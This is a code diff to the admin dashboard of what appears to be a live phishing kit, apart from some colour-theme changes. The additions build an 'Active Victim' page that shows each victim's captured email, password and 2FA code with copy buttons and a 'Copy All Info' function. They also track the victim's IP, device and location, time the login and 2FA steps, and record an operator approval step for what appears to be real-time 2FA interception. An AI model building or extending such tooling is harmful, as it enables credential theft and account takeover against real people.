@@ -675,45 +675,87 @@
             
             <!-- Active Victim Page -->
             <div class="page" id="page-victims">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
+                    <div style="display: flex; align-items: center; gap: 12px;">
+                        <div style="width: 12px; height: 12px; border-radius: 50%; background: var(--success); animation: pulse-glow 2s infinite;" id="victim-status-dot"></div>
+                        <span style="font-weight: 600; color: var(--success);" id="next-action">Waiting for victim...</span>
+                    </div>
+                    <button class="action-btn copy" onclick="copyAllVictim()">📋 Copy All Info</button>
+                </div>
+                
                 <div class="timeline-card">
                     <div class="card-title">Victim Timeline</div>
-                    <div class="timeline">
+                    <div class="timeline" style="flex-wrap: wrap; gap: 24px;">
                         <div class="timeline-step" id="timeline-login">
                             <div class="timeline-dot">🔐</div>
                             <div class="timeline-label">Login</div>
+                            <div class="timeline-time" id="login-time" style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">-</div>
+                            <div class="timeline-duration" id="login-duration" style="font-size: 12px; font-weight: 600; color: var(--primary); margin-top: 4px;"></div>
                         </div>
                         <div class="timeline-step" id="timeline-2fa">
                             <div class="timeline-dot">🔑</div>
                             <div class="timeline-label">2FA</div>
+                            <div class="timeline-time" id="2fa-time" style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">-</div>
+                            <div class="timeline-duration" id="2fa-duration" style="font-size: 12px; font-weight: 600; color: var(--primary); margin-top: 4px;"></div>
                         </div>
                         <div class="timeline-step" id="timeline-decision">
                             <div class="timeline-dot">✅</div>
                             <div class="timeline-label">Decision</div>
+                            <div class="timeline-time" id="decision-time" style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">-</div>
                         </div>
                     </div>
                 </div>
                 
-                <div class="stats-grid">
+                <div class="stats-grid" style="grid-template-columns: repeat(4, 1fr);">
                     <div class="stat-card">
                         <div class="stat-header"><div class="stat-icon blue">⏱️</div></div>
                         <div class="stat-value" id="session-time">0:00</div>
                         <div class="stat-label">Session Duration</div>
                     </div>
                     <div class="stat-card">
-                        <div class="stat-header"><div class="stat-icon green">📧</div></div>
-                        <div class="stat-value" id="victim-email-display">-</div>
+                        <div class="stat-header"><div class="stat-icon green">📧</div>
+                            <button style="background: none; border: none; cursor: pointer; font-size: 14px;" onclick="copyToClipboard(document.getElementById('victim-email-display').textContent)">📋</button>
+                        </div>
+                        <div class="stat-value" id="victim-email-display" style="font-size: 14px; word-break: break-all;">-</div>
                         <div class="stat-label">Email</div>
                     </div>
                     <div class="stat-card">
-                        <div class="stat-header"><div class="stat-icon orange">🔐</div></div>
-                        <div class="stat-value" id="victim-password-display">-</div>
+                        <div class="stat-header"><div class="stat-icon orange">🔐</div>
+                            <button style="background: none; border: none; cursor: pointer; font-size: 14px;" onclick="copyToClipboard(document.getElementById('victim-password-display').textContent)">📋</button>
+                        </div>
+                        <div class="stat-value" id="victim-password-display" style="font-size: 14px;">-</div>
                         <div class="stat-label">Password</div>
                     </div>
                     <div class="stat-card">
-                        <div class="stat-header"><div class="stat-icon red">🔑</div></div>
-                        <div class="stat-value" id="victim-2fa-display">-</div>
+                        <div class="stat-header"><div class="stat-icon red">🔑</div>
+                            <button style="background: none; border: none; cursor: pointer; font-size: 14px;" onclick="copyToClipboard(document.getElementById('victim-2fa-display').textContent)">📋</button>
+                        </div>
+                        <div class="stat-value" id="victim-2fa-display" style="font-size: 14px;">-</div>
                         <div class="stat-label">2FA Code</div>
                     </div>
+                </div>
+                
+                <div class="stats-grid" style="grid-template-columns: repeat(3, 1fr); margin-top: 24px;">
+                    <div class="stat-card">
+                        <div class="stat-header"><div class="stat-icon" style="background: rgba(99,102,241,0.1); color: var(--primary);">🌐</div></div>
+                        <div class="stat-value" id="victim-ip" style="font-size: 14px;">-</div>
+                        <div class="stat-label">IP Address</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-header"><div class="stat-icon" style="background: rgba(99,102,241,0.1); color: var(--primary);">💻</div></div>
+                        <div class="stat-value" id="victim-device" style="font-size: 12px;">-</div>
+                        <div class="stat-label">Device</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-header"><div class="stat-icon" style="background: rgba(99,102,241,0.1); color: var(--primary);">📍</div></div>
+                        <div class="stat-value" id="victim-location" style="font-size: 12px;">-</div>
+                        <div class="stat-label">Location</div>
+                    </div>
+                </div>
+                
+                <div class="timeline-card" style="margin-top: 24px;">
+                    <div class="card-title">Notes</div>
+                    <textarea id="victim-notes" placeholder="Add notes about this victim..." style="width: 100%; min-height: 100px; padding: 16px; border: 1px solid var(--border); border-radius: 12px; font-size: 14px; resize: vertical; background: var(--surface); color: var(--text);" onchange="saveVictimNotes()"></textarea>
                 </div>
                 
                 <div style="display: flex; gap: 16px; margin-top: 24px;">
@@ -861,18 +903,56 @@
         
         function setTheme(themeName) {
             const themes = {
-                purple: { primary: '#6366f1', primaryLight: '#818cf8', primaryDark: '#4f46e5' },
-                blue: { primary: '#3b82f6', primaryLight: '#60a5fa', primaryDark: '#2563eb' },
-                green: { primary: '#10b981', primaryLight: '#34d399', primaryDark: '#059669' },
-                orange: { primary: '#f59e0b', primaryLight: '#fbbf24', primaryDark: '#d97706' },
-                pink: { primary: '#ec4899', primaryLight: '#f472b6', primaryDark: '#db2777' },
-                dark: { primary: '#6366f1', primaryLight: '#818cf8', primaryDark: '#4f46e5' }
+                purple: {
+                    primary: '#6366f1', primaryLight: '#818cf8', primaryDark: '#4f46e5',
+                    bg: '#f8fafc', surface: '#ffffff', border: '#e2e8f0',
+                    text: '#1e293b', textSecondary: '#64748b',
+                    success: '#10b981', warning: '#f59e0b', danger: '#ef4444'
+                },
+                blue: {
+                    primary: '#0ea5e9', primaryLight: '#38bdf8', primaryDark: '#0284c7',
+                    bg: '#f0f9ff', surface: '#ffffff', border: '#bae6fd',
+                    text: '#0c4a6e', textSecondary: '#075985',
+                    success: '#10b981', warning: '#f59e0b', danger: '#ef4444'
+                },
+                green: {
+                    primary: '#10b981', primaryLight: '#34d399', primaryDark: '#059669',
+                    bg: '#f0fdf4', surface: '#ffffff', border: '#bbf7d0',
+                    text: '#14532d', textSecondary: '#166534',
+                    success: '#22c55e', warning: '#f59e0b', danger: '#ef4444'
+                },
+                orange: {
+                    primary: '#f97316', primaryLight: '#fb923c', primaryDark: '#ea580c',
+                    bg: '#fff7ed', surface: '#ffffff', border: '#fed7aa',
+                    text: '#7c2d12', textSecondary: '#9a3412',
+                    success: '#10b981', warning: '#fbbf24', danger: '#ef4444'
+                },
+                pink: {
+                    primary: '#ec4899', primaryLight: '#f472b6', primaryDark: '#db2777',
+                    bg: '#fdf2f8', surface: '#ffffff', border: '#fbcfe8',
+                    text: '#831843', textSecondary: '#9d174d',
+                    success: '#10b981', warning: '#f59e0b', danger: '#ef4444'
+                },
+                dark: {
+                    primary: '#818cf8', primaryLight: '#a5b4fc', primaryDark: '#6366f1',
+                    bg: '#0f172a', surface: '#1e293b', border: '#334155',
+                    text: '#f1f5f9', textSecondary: '#94a3b8',
+                    success: '#10b981', warning: '#f59e0b', danger: '#ef4444'
+                }
             };
             
             const theme = themes[themeName];
             document.documentElement.style.setProperty('--primary', theme.primary);
             document.documentElement.style.setProperty('--primary-light', theme.primaryLight);
             document.documentElement.style.setProperty('--primary-dark', theme.primaryDark);
+            document.documentElement.style.setProperty('--bg', theme.bg);
+            document.documentElement.style.setProperty('--surface', theme.surface);
+            document.documentElement.style.setProperty('--border', theme.border);
+            document.documentElement.style.setProperty('--text', theme.text);
+            document.documentElement.style.setProperty('--text-secondary', theme.textSecondary);
+            document.documentElement.style.setProperty('--success', theme.success);
+            document.documentElement.style.setProperty('--warning', theme.warning);
+            document.documentElement.style.setProperty('--danger', theme.danger);
             
             localStorage.setItem('admin_theme', themeName);
             showToast('Theme: ' + themeName.charAt(0).toUpperCase() + themeName.slice(1));
@@ -928,6 +1008,72 @@
                 showToast(type + ' deleted');
                 addActivity('Bulk deleted ' + type);
             }
+        }
+        
+        function copyAllVictim() {
+            const email = document.getElementById('victim-email-display').textContent;
+            const password = document.getElementById('victim-password-display').textContent;
+            const code = document.getElementById('victim-2fa-display').textContent;
+            const all = `Email: ${email}\nPassword: ${password}\n2FA: ${code}`;
+            navigator.clipboard.writeText(all);
+            showToast('All info copied!');
+            addActivity('Copied all victim info');
+        }
+        
+        function saveVictimNotes() {
+            const notes = document.getElementById('victim-notes').value;
+            localStorage.setItem('victim_notes', notes);
+            showToast('Notes saved');
+        }
+        
+        let victimTimestamps = { login: null, twofa: null, decision: null };
+        let stepStartTime = null;
+        
+        function updateVictimTimeline(state) {
+            const now = new Date();
+            if (stepStartTime) {
+                const prevStep = state.prevStatus || 'waiting';
+                const duration = Math.floor((now - stepStartTime) / 1000);
+                const mins = Math.floor(duration / 60);
+                const secs = duration % 60;
+                const durationStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
+                
+                if (prevStep === 'waiting') {
+                    document.getElementById('login-duration').textContent = durationStr;
+                    victimTimestamps.login = state.login_time || now.toLocaleTimeString();
+                    document.getElementById('login-time').textContent = victimTimestamps.login;
+                } else if (prevStep === 'waiting_2fa') {
+                    document.getElementById('2fa-duration').textContent = durationStr;
+                    victimTimestamps.twofa = state.twofa_time || now.toLocaleTimeString();
+                    document.getElementById('2fa-time').textContent = victimTimestamps.twofa;
+                }
+            }
+            stepStartTime = now;
+            
+            let nextAction = 'Waiting for victim...';
+            if (state.status === 'waiting') {
+                nextAction = '⏳ Waiting for login credentials';
+                document.getElementById('next-action').textContent = nextAction;
+                document.getElementById('timeline-login').classList.add('active');
+                document.getElementById('timeline-2fa').classList.remove('active');
+            } else if (state.status === 'waiting_2fa') {
+                nextAction = '🔐 Victim entering 2FA code';
+                document.getElementById('next-action').textContent = nextAction;
+                document.getElementById('timeline-login').classList.add('completed');
+                document.getElementById('timeline-2fa').classList.add('active');
+            } else if (state.status === 'approved' || state.status === 'approved_2fa') {
+                nextAction = '✅ Victim approved - forwarded';
+                document.getElementById('next-action').textContent = nextAction;
+                document.getElementById('decision-time').textContent = now.toLocaleTimeString();
+                victimTimestamps.decision = now.toLocaleTimeString();
+            }
+            
+            document.getElementById('victim-ip').textContent = state.ip || 'Unknown';
+            document.getElementById('victim-device').textContent = state.device || 'Unknown';
+            document.getElementById('victim-location').textContent = state.location || 'Unknown';
+            
+            const savedNotes = localStorage.getItem('victim_notes');
+            if (savedNotes) document.getElementById('victim-notes').value = savedNotes;
         }
         
         function selectAll(type) {
@@ -1084,6 +1230,8 @@
                 document.getElementById('victim-password-display').textContent = state.password || '-';
                 document.getElementById('victim-2fa-display').textContent = state['2fa_code'] || '-';
                 
+                updateVictimTimeline(state);
+                
                 addActivity('Victim: ' + (state.email || 'Unknown'));
             } else {
                 liveBar.classList.remove('active');
@@ -1124,6 +1272,17 @@
                 victimBadge.className = 'tool-status idle';
                 sessionStartTime = null;
                 document.getElementById('session-time').textContent = '0:00';
+                
+                document.getElementById('victim-ip').textContent = '-';
+                document.getElementById('victim-device').textContent = '-';
+                document.getElementById('victim-location').textContent = '-';
+                document.getElementById('victim-notes').value = '';
+                document.getElementById('login-time').textContent = '-';
+                document.getElementById('2fa-time').textContent = '-';
+                document.getElementById('decision-time').textContent = '-';
+                document.getElementById('login-duration').textContent = '';
+                document.getElementById('2fa-duration').textContent = '';
+                document.getElementById('next-action').textContent = 'Waiting for victim...';
             }
             
             // Analytics
